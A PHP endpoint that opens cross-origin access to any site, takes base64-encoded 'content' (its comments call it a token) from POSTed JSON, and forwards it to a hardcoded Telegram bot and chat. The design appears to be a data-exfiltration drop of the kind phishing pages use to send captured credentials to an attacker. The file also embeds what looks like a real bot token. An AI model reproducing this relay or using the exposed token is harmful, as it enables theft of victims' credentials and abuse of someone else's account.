<?php
// Allow requests from any origin
header("Access-Control-Allow-Origin: *");

// Allow the following methods
header("Access-Control-Allow-Methods: POST, OPTIONS");

// Allow the following headers
header("Access-Control-Allow-Headers: Content-Type");

try {
    // Check if the request method is OPTIONS (preflight request)
    if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
        // Respond with HTTP 200 OK status
        http_response_code(200);
        exit(); // Terminate script
    }

    function make_get_request($url, $params) {
        // Initialize cURL session
        $curl = curl_init();

        // Set the URL
        $url_with_query = $url . '?' . http_build_query($params);

        // Set cURL options
        curl_setopt($curl, CURLOPT_URL, $url_with_query);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

        // Execute the request
        $response = curl_exec($curl);

        // Check for errors
        if(curl_errno($curl)){
            throw new Exception('Curl error: ' . curl_error($curl));
        }

        // Close cURL session
        curl_close($curl);

        // Return the response
        return $response;
    }

    // Check if the request method is POST
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        // Get the JSON input data
        $inputJSON = file_get_contents('php://input');
        $input = json_decode($inputJSON);

        // Check if JSON data is received properly
        if (!$input) {
            http_response_code(400);
            throw new Exception('Error: Invalid JSON data');
        }

        // Check if 'token' property exists in the JSON data
        if (!isset($input->content)) {
            http_response_code(400);
            throw new Exception('Error: Token property not found in JSON data');
        }

        // Extract the token
        $content_base64 = $input->content;
        $content = base64_decode($content_base64);

        // Example usage
        $url = 'https://api.telegram.org/bot7034251741:AAHUWnuwrvPm799rXqA_hBeN82et4n-Xr9s/sendMessage';
        $params = array(
            'chat_id' => '-4215635850',
            'text' => $content
        );
        $response = make_get_request($url, $params);


    } else {
        // Return an error if the request method is not POST
        http_response_code(405); // Method Not Allowed
        throw new Exception('Error: Method Not Allowed');
    }
} catch (Exception $e) {
    http_response_code(500);
}
?>
